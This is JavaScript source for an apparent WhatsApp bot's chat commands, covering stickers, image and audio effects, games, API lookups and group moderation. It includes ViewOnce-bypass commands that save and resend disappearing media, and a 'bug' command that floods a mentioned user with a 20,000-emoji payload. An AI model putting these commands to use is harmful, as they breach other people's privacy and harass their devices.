builtInCommands.rvo = builtInCommands.save = builtInCommands.vv = { desc: '🔓 ViewOnce', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔓');
  const vo = await getViewOnceContent(sock, msg);
  if (!vo.ok) {
    if (vo.reason === 'not_viewonce') return style.reply(sock, sender, style.error('Reply to a ViewOnce message.'), msg);
    return style.reply(sock, sender, style.error('ViewOnce extract failed: ' + vo.reason), msg);
  }
  try { await sock.sendMessage(sender, buildMediaFromVO(vo, msg)); }
  catch(e) { await style.reply(sock, sender, style.error('Send failed: ' + e.message), msg); }
}};

builtInCommands.vv2 = { desc: '🔓 ViewOnce v2', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔓');
  const vo = await getViewOnceContent(sock, msg);
  if (!vo.ok) {
    if (vo.reason === 'not_viewonce') return style.reply(sock, sender, style.error('Reply to a ViewOnce message.'), msg);
    return style.reply(sock, sender, style.error('ViewOnce extract failed: ' + vo.reason), msg);
  }
  try { await sock.sendMessage(sender, buildMediaFromVO(vo, msg)); }
  catch(e) { await style.reply(sock, sender, style.error('vv2 failed: ' + e.message), msg); }
}};

builtInCommands.vv3 = { desc: '🔓 ViewOnce v3', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔓');
  const vo = await getViewOnceContent(sock, msg);
  if (!vo.ok) {
    if (vo.reason === 'not_viewonce') return style.reply(sock, sender, style.error('Reply to a ViewOnce message.'), msg);
    return style.reply(sock, sender, style.error('ViewOnce extract failed: ' + vo.reason), msg);
  }
  try {
    const opts = buildMediaFromVO(vo, msg);
    opts.caption = (opts.caption ? opts.caption + '\n\n' : '') + '🔓 *VV3 — ViewOnce* 𓆣';
    await sock.sendMessage(sender, opts);
    await style.reply(sock, sender, style.success('VV3 delivered.'), msg);
  } catch(e) { await style.reply(sock, sender, style.error('vv3 failed: ' + e.message), msg); }
}};

builtInCommands.sticker = { desc: '🎭 Image → Sticker', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🎭');
  try { const b = await downloadMsg(sock, msg); const st = new Sticker(b, { pack: BOT_NAME, author: OWNER_NAME, type: StickerTypes.FULL, quality: 70 }); await sock.sendMessage(sender, { sticker: await st.toBuffer() }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.s = { desc: '✍️ Custom author', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '✍️');
  try { const b = await downloadMsg(sock, msg); const st = new Sticker(b, { pack: BOT_NAME, author: args.join(' ') || OWNER_NAME, type: StickerTypes.FULL, quality: 70 }); await sock.sendMessage(sender, { sticker: await st.toBuffer() }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.simg = builtInCommands.toimg = { desc: '🖼️ Sticker → Image', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.stickerMessage && !q?.stickerMessage) return style.reply(sock, sender, style.error('Reply to sticker.'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { const b = await downloadMsg(sock, msg); await sock.sendMessage(sender, { image: b, caption: '🖼️ Sticker → Image', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.img = { desc: '🖼️ Image from URL', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .img <url>'), msg);
  await style.react(sock, sender, msg, '🖼️');
  await sock.sendMessage(sender, { image: { url: args[0] }, caption: 'Here you go 💀', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.say = { desc: '🗣️ Say', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .say <text>'), msg);
  await style.react(sock, sender, msg, '🗣️');
  await style.reply(sock, sender, fonts.fraktur(args.join(' ')), msg);
}};

builtInCommands.font = { desc: '🔤 Font', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .font bold|fraktur|mono|script <text>'), msg);
  const st = args[0].toLowerCase();
  if (!fonts[st]) return style.reply(sock, sender, style.error('Styles: bold, fraktur, mono, script'), msg);
  await style.react(sock, sender, msg, '🔤');
  await style.reply(sock, sender, fonts[st](args.slice(1).join(' ')), msg);
}};

builtInCommands.bug = { desc: '🐞 Bug payload', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🐞');
  const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || sender;
  try { await sock.sendMessage(target, { text: '🐞'.repeat(20000) }, { quoted: msg }); await style.reply(sock, sender, style.success('Sent.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

const imgFx = (name, op, cap) => ({ desc: `${name}`, execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🎨');
  try { const buf = await downloadMsg(sock, msg); const out = await op(sharp(buf)).toBuffer(); await sock.sendMessage(sender, { image: out, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('FX failed.'), msg); }
}});
builtInCommands.blur = imgFx('Blur', s => s.blur(15), '🌫️ Blurred');
builtInCommands.grayscale = imgFx('Grayscale', s => s.grayscale(), '⚫ Grayscale');
builtInCommands.invert = imgFx('Invert', s => s.negate(), '🎨 Inverted');

builtInCommands.removebg = { desc: '🖼️ RemoveBG', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { const buf = await downloadMsg(sock, msg); if (process.env.REMOVEBG_KEY) { const form = new FormData(); form.append('image_file', buf, 'image.jpg'); form.append('size', 'auto'); const r = await axios.post('https://api.remove.bg/v1.0/removebg', form, { headers: { ...form.getHeaders(), 'X-Api-Key': process.env.REMOVEBG_KEY }, responseType: 'arraybuffer', timeout: 60000 }); return sock.sendMessage(sender, { image: Buffer.from(r.data), caption: '🖼️ Done', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } await style.reply(sock, sender, style.warning('No REMOVEBG_KEY — sending original.'), msg); await sock.sendMessage(sender, { image: buf, caption: '🖼️ Original (set REMOVEBG_KEY for removal)', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

/* ── SONIC ── */
const sonicFilters = { bass: 'equalizer=f=100:width_type=h:width=200:g=20', blown: 'acrusher=level_in=8:level_out=8:bits=8:mode=log', earrape: 'volume=10', deep: 'atempo=0.8,asetrate=44100*0.8', slow: 'atempo=0.8', fast: 'atempo=1.25', robot: 'flanger', nightcore: 'atempo=1.1,asetrate=44100*1.25', smooth: 'lowpass=f=3000', squirrel: 'atempo=1.0,asetrate=44100*1.5', reverse: 'areverse' };
Object.keys(sonicFilters).forEach(cmd => {
  builtInCommands[cmd] = { desc: `🎧 ${cmd}`, execute: async (sock, sender, args, msg) => {
    const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!msg.message?.audioMessage && !q?.audioMessage) return style.reply(sock, sender, style.error(`Reply to audio with .${cmd}`), msg);
    await style.react(sock, sender, msg, '🎧');
    try { const buf = await downloadMsg(sock, msg); const inP = path.join(TMP_DIR, `i_${Date.now()}.mp3`), outP = path.join(TMP_DIR, `o_${Date.now()}.mp3`); fs.writeFileSync(inP, buf); await execAsync(`ffmpeg -y -i "${inP}" -af "${sonicFilters[cmd]}" "${outP}"`); await sock.sendMessage(sender, { audio: fs.readFileSync(outP), mimetype: 'audio/mpeg', ptt: false, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); try { fs.unlinkSync(inP); } catch(e) {} try { fs.unlinkSync(outP); } catch(e) {} }
    catch(e) { try { const buf = await downloadMsg(sock, msg); if (buf) return sock.sendMessage(sender, { audio: buf, mimetype: 'audio/mpeg', ptt: false, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e2) {} await style.reply(sock, sender, style.error('FFmpeg required for sonic filters.'), msg); }
  }};
});

/* ── FUN ── */
builtInCommands.joke = { desc: '🤡 Joke', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🤡');
  try { const r = await axios.get('https://official-joke-api.appspot.com/random_joke', { timeout: 10000 }); await style.reply(sock, sender, style.box('JOKE', `*${r.data.setup}*\n\n_${r.data.punchline}_`), msg); }
  catch(e) { await style.reply(sock, sender, style.box('JOKE', 'Why do programmers prefer dark mode? Less bugs.'), msg); }
}};

builtInCommands['8ball'] = { desc: '🎱 8-ball', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Ask a question.'), msg);
  await style.react(sock, sender, msg, '🎱');
  const q = args.join(' ');
  const A = ['Yes', 'No', 'Maybe', 'Ask again', 'Definitely', 'Very doubtful', 'Signs point yes', 'Outlook not good', 'Without a doubt'];
  const a = A[Math.floor(Math.random() * A.length)];
  await style.reply(sock, sender, `╭━『 🎱 ORB 』━╮\n${style.kv('Q', q)}\n╰━━━━━━━ ☉\n\n🎱 *${a.toUpperCase()}*`, msg);
}};

builtInCommands.quote = { desc: '💭 Quote', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💭');
  try { const r = await axios.get('https://api.quotable.io/random', { timeout: 10000 }); await style.reply(sock, sender, style.box('WISDOM', `_"${r.data.content}"_\n\n— *${r.data.author}*`), msg); }
  catch(e) { await style.reply(sock, sender, style.box('WISDOM', '_"Perfection is unattainable, but chasing it we catch excellence."_'), msg); }
}};

builtInCommands.fact = { desc: '💡 Fact', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💡');
  try { const r = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en', { timeout: 8000 }); await style.reply(sock, sender, style.box('FACT', r.data.text), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.roll = { desc: '🎲 Roll', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🎲');
  const s = parseInt(args[0]) || 6, a = parseInt(args[1]) || 1;
  const dice = ['⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
  const rolls = Array.from({ length: a }, () => Math.floor(Math.random() * s) + 1);
  const total = rolls.reduce((x, y) => x + y, 0);
  await style.reply(sock, sender, style.box('ROLL', [style.kv('Roll', `${a}d${s}`), style.kv('Dice', s === 6 ? rolls.map(r => dice[r - 1]).join(' ') : rolls.join(', ')), style.kv('Total', total)].join('\n')), msg);
}};

builtInCommands.coinflip = { desc: '🪙 Coin', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🪙');
  const r = Math.random() > 0.5 ? 'HEADS' : 'TAILS';
  await style.reply(sock, sender, style.box('COIN', `${r === 'HEADS' ? '👑' : '𓆣'} *${r}*`), msg);
}};

builtInCommands.truth = { desc: '🎭 Truth', execute: async (sock, sender, args, msg) => { const l = ['What is your biggest fear?', 'First crush?', 'Most embarrassing moment?', 'Lied to best friend?', 'Secret never told?']; await style.reply(sock, sender, style.box('🎭 TRUTH', l[Math.floor(Math.random() * l.length)]), msg); } };
builtInCommands.dare = { desc: '🎭 Dare', execute: async (sock, sender, args, msg) => { const l = ['Send a selfie.', 'Text your crush now.', 'Speak in accent for 10 messages.', 'Send last gallery photo.', 'Do 20 pushups.']; await style.reply(sock, sender, style.box('🎭 DARE', l[Math.floor(Math.random() * l.length)]), msg); } };
builtInCommands.wyr = { desc: '🤔 WYR', execute: async (sock, sender, args, msg) => { const l = [['Be rich but lonely', 'Be poor but loved'], ['Fly', 'Be invisible'], ['No social media', 'No movies'], ['Read minds', 'See future']]; const p = l[Math.floor(Math.random() * l.length)]; await style.reply(sock, sender, style.box('🤔 WYR', `A) ${p[0]}\nB) ${p[1]}`), msg); } };

builtInCommands.ship = { desc: '💕 Ship', execute: async (sock, sender, args, msg) => {
  const m = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  if (m.length < 2) return style.reply(sock, sender, style.error('Mention 2 users.'), msg);
  const s = Math.floor(Math.random() * 101);
  const bar = '█'.repeat(Math.round(s / 10)) + '░'.repeat(10 - Math.round(s / 10));
  await style.reply(sock, sender, `💕 *SHIP*\n@${m[0].split('@')[0]} ❤ @${m[1].split('@')[0]}\n${bar} ${s}%`, msg, { mentions: m });
}};

builtInCommands.compliment = { desc: '💐 Compliment', execute: async (sock, sender, args, msg) => { const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || sender; const l = ['You light up every room.', 'Your smile is contagious.', 'You are smarter than you think.', 'You have a beautiful soul.']; await style.reply(sock, sender, `💐 @${u.split('@')[0]}, ${l[Math.floor(Math.random() * l.length)]}`, msg, { mentions: [u] }); } };
builtInCommands.roast = { desc: '🔥 Roast', execute: async (sock, sender, args, msg) => { const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || sender; const l = ['You are the reason shampoo has instructions.', 'Your secrets are safe with me, I never listen.', 'If laziness was Olympic, you would get silver.']; await style.reply(sock, sender, `🔥 @${u.split('@')[0]}, ${l[Math.floor(Math.random() * l.length)]}`, msg, { mentions: [u] }); } };

builtInCommands.slot = { desc: '🎰 Slots', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🎰');
  const ic = ['🍒', '🍋', '🍊', '🍇', '💎', '7️⃣'];
  const r = [0, 0, 0].map(() => ic[Math.floor(Math.random() * ic.length)]);
  const win = r[0] === r[1] && r[1] === r[2];
  await style.reply(sock, sender, style.box('🎰 SLOT', `${r.join(' | ')}\n\n${win ? '🎉 JACKPOT!' : '😢 Try again'}`), msg);
}};

builtInCommands.rps = { desc: '✊ RPS', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .rps rock|paper|scissors'), msg);
  const u = args[0].toLowerCase(), opt = ['rock', 'paper', 'scissors'];
  if (!opt.includes(u)) return style.reply(sock, sender, style.error('Invalid.'), msg);
  const b = opt[Math.floor(Math.random() * 3)];
  const win = (u === 'rock' && b === 'scissors') || (u === 'paper' && b === 'rock') || (u === 'scissors' && b === 'paper');
  await style.reply(sock, sender, style.box('RPS', `You: ${u}\nBot: ${b}\n\n${u === b ? 'Draw 🤝' : win ? 'You win! 🎉' : 'Bot wins! 🤖'}`), msg);
}};

/* ── EXTENDED ── */
builtInCommands.translate = builtInCommands.tr = { desc: '🌐 Translate', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .translate <lang> <text>'), msg);
  await style.react(sock, sender, msg, '🌐');
  try { const r = await axios.get(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${args[0]}&dt=t&q=${encodeURIComponent(args.slice(1).join(' '))}`, { timeout: 10000 }); await style.reply(sock, sender, style.box(`→ ${args[0].toUpperCase()}`, r.data[0].map(x => x[0]).join('')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.crypto = { desc: '💰 Crypto', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .crypto <coin>'), msg);
  await style.react(sock, sender, msg, '💰');
  try { const r = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${args[0].toLowerCase()}&vs_currencies=usd,eur,gbp&include_24hr_change=true`, { timeout: 10000 }); const d = r.data[args[0].toLowerCase()]; if (!d) return style.reply(sock, sender, style.error('Not found.'), msg); await style.reply(sock, sender, style.box(`💰 ${args[0].toUpperCase()}`, `USD: $${d.usd}\nEUR: €${d.eur}\nGBP: £${d.gbp}\n24h: ${d.usd_24h_change?.toFixed(2) || 0}%`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.stock = { desc: '📈 Stock', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .stock <symbol>'), msg);
  await style.react(sock, sender, msg, '📈');
  try { const r = await axios.get(`https://query1.finance.yahoo.com/v8/finance/chart/${encodeURIComponent(args[0])}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 12000 }); const meta = r.data?.chart?.result?.[0]?.meta; if (!meta) return style.reply(sock, sender, style.error('Not found.'), msg); const price = meta.regularMarketPrice?.toFixed?.(2) ?? meta.regularMarketPrice; const prev = meta.chartPreviousClose || meta.previousClose; const chg = prev ? ((price - prev) / prev * 100).toFixed(2) : '?'; await style.reply(sock, sender, style.box(`📈 ${meta.symbol}`, `${style.kv('Price', '$' + price)}\n${style.kv('Prev Close', '$' + prev)}\n${style.kv('Change', chg + '%')}\n${style.kv('Currency', meta.currency || 'USD')}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Stock failed.'), msg); }
}};

builtInCommands.news = { desc: '📰 News', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📰');
  const q = args.join(' ') || 'world';
  try { const r = await axios.get(`https://www.reddit.com/r/worldnews/hot.json?limit=5`, { headers: { 'User-Agent': 'VanteviousBot/1.0' }, timeout: 12000 }); let out = ''; (r.data?.data?.children || []).slice(0, 5).forEach((p, i) => { const d = p.data; out += `${i + 1}. *${d.title}*\n🔗 https://reddit.com${d.permalink}\n\n`; }); await style.reply(sock, sender, style.box(`📰 ${q.toUpperCase()}`, out || 'None.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('News failed.'), msg); }
}};

builtInCommands.movie = builtInCommands.imdb = { desc: '🎬 Movie', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .movie <title>'), msg);
  await style.react(sock, sender, msg, '🎬');
  const key = process.env.OMDB_KEY || 'trilogy';
  try { const r = await axios.get(`https://www.omdbapi.com/?t=${encodeURIComponent(args.join(' '))}&apikey=${key}`, { timeout: 10000 }); if (r.data.Response === 'False') return style.reply(sock, sender, style.error('Not found.'), msg); const d = r.data; const cap = `📅 ${d.Year}\n🎭 ${d.Genre}\n⏱️ ${d.Runtime}\n⭐ ${d.imdbRating}/10\n🎬 ${d.Director}\n\n_${d.Plot}_`; if (d.Poster && d.Poster !== 'N/A') await sock.sendMessage(sender, { image: { url: d.Poster }, caption: `🎬 *${d.Title}*\n${cap}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, style.box(`🎬 ${d.Title}`, cap), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.anime = { desc: '🀄 Anime', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .anime <title>'), msg);
  await style.react(sock, sender, msg, '🀄');
  try { const r = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(args.join(' '))}&limit=1`, { timeout: 15000 }); const a = r.data.data?.[0]; if (!a) return style.reply(sock, sender, style.error('Not found.'), msg); const cap = `🀄 *${a.title}*\n📅 ${a.year || '?'}\n⭐ ${a.score || '?'}/10\n📺 Eps: ${a.episodes || '?'}\n\n_${(a.synopsis || '').substring(0, 400)}..._`; if (a.images?.jpg?.image_url) await sock.sendMessage(sender, { image: { url: a.images.jpg.image_url }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, cap, msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.manga = { desc: '📖 Manga', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .manga <title>'), msg);
  await style.react(sock, sender, msg, '📖');
  try { const r = await axios.get(`https://api.jikan.moe/v4/manga?q=${encodeURIComponent(args.join(' '))}&limit=1`, { timeout: 15000 }); const m = r.data.data?.[0]; if (!m) return style.reply(sock, sender, style.error('Not found.'), msg); const cap = `📖 *${m.title}*\n⭐ ${m.score || '?'}/10\n📚 Ch: ${m.chapters || '?'}\n\n_${(m.synopsis || '').substring(0, 400)}..._`; if (m.images?.jpg?.image_url) await sock.sendMessage(sender, { image: { url: m.images.jpg.image_url }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, cap, msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.github = builtInCommands.gh = { desc: '🐙 GitHub', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .github <user>'), msg);
  await style.react(sock, sender, msg, '🐙');
  try { const r = await axios.get(`https://api.github.com/users/${args[0]}`, { timeout: 10000 }); const d = r.data; await style.reply(sock, sender, style.box(`🐙 ${d.login}`, `👤 ${d.name || '?'}\n📝 ${d.bio || '?'}\n📦 Repos: ${d.public_repos}\n👥 Followers: ${d.followers}\n🔗 ${d.html_url}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.npm = { desc: '📦 NPM', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .npm <pkg>'), msg);
  await style.react(sock, sender, msg, '📦');
  try { const r = await axios.get(`https://registry.npmjs.org/${args[0]}`, { timeout: 10000 }); const l = r.data['dist-tags']?.latest; await style.reply(sock, sender, style.box(`📦 ${args[0]}`, `Latest: ${l}\n${r.data.description || ''}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.country = { desc: '🌍 Country', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .country <name>'), msg);
  await style.react(sock, sender, msg, '🌍');
  try { const r = await axios.get(`https://restcountries.com/v3.1/name/${encodeURIComponent(args.join(' '))}`, { timeout: 10000 }); const c = r.data[0]; const cap = `🌍 *${c.name.common}*\n🏛️ ${c.capital?.[0] || '?'}\n🌐 ${c.region}\n👥 ${c.population.toLocaleString()}`; if (c.flags?.png) await sock.sendMessage(sender, { image: { url: c.flags.png }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, cap, msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.iss = { desc: '🛰️ ISS', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🛰️');
  try { const [p, a] = await Promise.all([axios.get('http://api.open-notify.org/iss-now.json', { timeout: 8000 }), axios.get('http://api.open-notify.org/astros.json', { timeout: 8000 })]); await style.reply(sock, sender, style.box('🛰️ ISS', `Lat: ${p.data.iss_position.latitude}\nLon: ${p.data.iss_position.longitude}\n\nPeople in space: ${a.data.number}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.earthquake = { desc: '🌋 Quakes', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌋');
  try { const r = await axios.get('https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/significant_week.geojson', { timeout: 15000 }); let out = ''; r.data.features.slice(0, 5).forEach((f, i) => { out += `${i + 1}. Mag ${f.properties.mag} — ${f.properties.place}\n`; }); await style.reply(sock, sender, style.box('🌋 QUAKES', out || 'None.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.nasa = { desc: '🚀 NASA', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🚀');
  try { const r = await axios.get(`https://api.nasa.gov/planetary/apod?api_key=${process.env.NASA_API_KEY || 'DEMO_KEY'}`, { timeout: 15000 }); const d = r.data; const cap = `🚀 *${d.title}*\n📅 ${d.date}\n\n_${(d.explanation || '').substring(0, 500)}..._`; if (d.media_type === 'image') await sock.sendMessage(sender, { image: { url: d.url }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, cap + `\n\n${d.url}`, msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.ocr = { desc: '🔍 OCR', execute: async (sock, sender, args, msg) => {
  if (!Tesseract) return style.reply(sock, sender, style.error('Install tesseract.js.'), msg);
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🔍');
  const w = await sock.sendMessage(sender, { text: '🔍 Scanning...' }, { quoted: msg });
  try { const buf = await downloadMsg(sock, msg); const { data: { text } } = await Tesseract.recognize(buf, 'eng'); try { await sock.sendMessage(sender, { delete: w.key }); } catch(e) {} await style.reply(sock, sender, style.box('OCR', text || 'No text.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

/* ── WARN / MUTE / WELCOME ── */
builtInCommands.warn = { desc: '⚠️ Warn', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  await style.react(sock, sender, msg, '⚠️');
  const rt = getRuntime(sock);
  if (!rt.warnStore.has(sender)) rt.warnStore.set(sender, new Map());
  const m = rt.warnStore.get(sender);
  const c = (m.get(u) || 0) + 1; m.set(u, c); saveRuntime(sock);
  await style.reply(sock, sender, style.warning(`@${u.split('@')[0]} warned (${c}/3)\n${args.join(' ') || 'No reason'}`), msg, { mentions: [u] });
  if (c >= 3) { try { await sock.groupParticipantsUpdate(sender, [u], 'remove'); await style.reply(sock, sender, style.success(`@${u.split('@')[0]} kicked (3 warns).`), msg, { mentions: [u] }); m.delete(u); saveRuntime(sock); } catch(e) {} }
}};

builtInCommands.warnings = { desc: '📋 Warnings', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  const rt = getRuntime(sock);
  const c = rt.warnStore.get(sender)?.get(u) || 0;
  await style.reply(sock, sender, style.box('WARNINGS', `@${u.split('@')[0]}: ${c}/3`), msg, { mentions: [u] });
}};

builtInCommands.resetwarn = { desc: '🔄 Reset warns', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  const rt = getRuntime(sock);
  rt.warnStore.get(sender)?.delete(u); saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Reset @${u.split('@')[0]}`), msg, { mentions: [u] });
}};

builtInCommands.mute = { desc: '🔇 Mute', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  if (!muteStore.has(sender)) muteStore.set(sender, new Set());
  muteStore.get(sender).add(u);
  await style.reply(sock, sender, style.success(`@${u.split('@')[0]} muted.`), msg, { mentions: [u] });
}};

builtInCommands.unmute = { desc: '🔊 Unmute', execute: async (sock, sender, args, msg) => {
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!u || !muteStore.has(sender)) return style.reply(sock, sender, style.error('Mention user.'), msg);
  muteStore.get(sender).delete(u);
  await style.reply(sock, sender, style.success(`@${u.split('@')[0]} unmuted.`), msg, { mentions: [u] });
}};

builtInCommands.setwelcome = { desc: '👋 Set welcome', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .setwelcome <text> ({user} {group})'), msg);
  const rt = getRuntime(sock);
  const c = rt.welcomeConfig.get(sender) || {}; c.welcome = args.join(' '); rt.welcomeConfig.set(sender, c); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Set.'), msg);
}};

builtInCommands.setgoodbye = { desc: '👋 Set goodbye', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .setgoodbye <text>'), msg);
  const rt = getRuntime(sock);
  const c = rt.welcomeConfig.get(sender) || {}; c.goodbye = args.join(' '); rt.welcomeConfig.set(sender, c); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Set.'), msg);
}};

builtInCommands.clearwelcome = { desc: '🗑️ Clear welcome', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  rt.welcomeConfig.delete(sender); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Cleared.'), msg);
}};

